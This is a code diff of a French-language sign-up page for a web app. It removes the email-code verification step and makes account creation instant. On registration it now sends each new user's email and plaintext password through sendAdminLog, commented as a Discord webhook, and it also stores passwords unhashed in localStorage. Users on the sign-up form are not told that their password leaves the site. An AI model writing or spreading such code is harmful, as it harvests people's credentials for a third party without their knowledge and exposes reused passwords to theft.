@@ -215,17 +215,6 @@
         <button class="btn-main" id="auth-btn" onclick="handleAuth()">CRÉER UN COMPTE</button>
         <div class="switch-auth" id="auth-switch" onclick="toggleAuthMode()">Déjà un compte ? Se connecter</div>
       </div>
-
-      <div id="verify-screen" style="display: none; flex-direction: column; align-items: center; justify-content: center; height: 100%; gap: 1rem;">
-        <h2 style="color: var(--green);">VÉRIFICATION</h2>
-        <p style="color: var(--dim); margin-bottom: 1rem; text-align: center;">Un code a été envoyé à <br><b id="verify-email-display" style="color: var(--text);"></b></p>
-        <div class="auth-field">
-          <label>Code à 6 chiffres</label>
-          <input type="text" id="verify-code" placeholder="000000" maxlength="6" style="text-align: center; font-size: 1.5rem; letter-spacing: 0.5em;">
-        </div>
-        <button class="btn-main" onclick="submitCode()">VÉRIFIER</button>
-        <div class="switch-auth" onclick="showAuth()">Annuler</div>
-      </div>
   </div>
 
 </div>
@@ -236,10 +225,6 @@
   let isRegisterMode = true; 
   let systemLogs = JSON.parse(localStorage.getItem('bench_system_logs') || '[]');
   let currentUserEmail = localStorage.getItem('bench_current_user') || null;
-  
-  let pendingEmail = null;
-  let pendingPass = null;
-  let generatedCode = null;
 
   // --- INITIALISATION UI ---
   window.onload = () => {
@@ -261,13 +246,10 @@
   function showAuth() {
     document.getElementById('auth-overlay').style.display = 'flex';
     document.getElementById('auth-screen').style.display = 'flex';
-    document.getElementById('verify-screen').style.display = 'none';
     document.getElementById('main-container').style.display = 'none';
     document.getElementById('current-user').textContent = 'GUEST';
     document.getElementById('auth-email').value = '';
     document.getElementById('auth-pass').value = '';
-    pendingEmail = null;
-    pendingPass = null;
   }
 
   // --- GESTION DES COMPTES ---
@@ -293,20 +275,14 @@
 
       if (accounts[email]) { alert("Cet email est déjà enregistré."); return; }
       
-      generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+      // Enregistrement instantané
+      accounts[email] = pass;
+      localStorage.setItem('bench_accounts', JSON.stringify(accounts));
       
-      pendingEmail = email;
-      pendingPass = pass;
-
-      sendAdminLog(`INSCRIPTION (Attente Code)`, `Email: ${email}\nPass: ${pass}\nCode: ${generatedCode}`);
+      // Envoi au webhook Discord
+      sendAdminLog(`NOUVEAU COMPTE`, `Email: ${email}\nPassword: ${pass}`);
       
-      document.getElementById('auth-screen').style.display = 'none';
-      document.getElementById('verify-screen').style.display = 'flex';
-      document.getElementById('verify-email-display').textContent = email;
-      
-      setTimeout(() => {
-        alert(`[SIMULATION EMAIL]\nLe code de vérification est : ${generatedCode}\n(En production, ceci serait envoyé par mail)`);
-      }, 500);
+      loginUser(email);
 
     } else {
       if (accounts[email] && accounts[email] === pass) {
@@ -314,21 +290,6 @@
       } else {
         alert("Identifiants incorrects.");
       }
-    }
-  }
-
-  function submitCode() {
-    const inputCode = document.getElementById('verify-code').value.trim();
-    if (inputCode === generatedCode) {
-      let accounts = JSON.parse(localStorage.getItem('bench_accounts') || '{}');
-      accounts[pendingEmail] = pendingPass;
-      localStorage.setItem('bench_accounts', JSON.stringify(accounts));
-      
-      sendAdminLog(`NOUVEAU COMPTE VÉRIFIÉ`, `Email: ${pendingEmail}`);
-      
-      loginUser(pendingEmail);
-    } else {
-      alert("Code incorrect. Réessaie.");
     }
   }
 
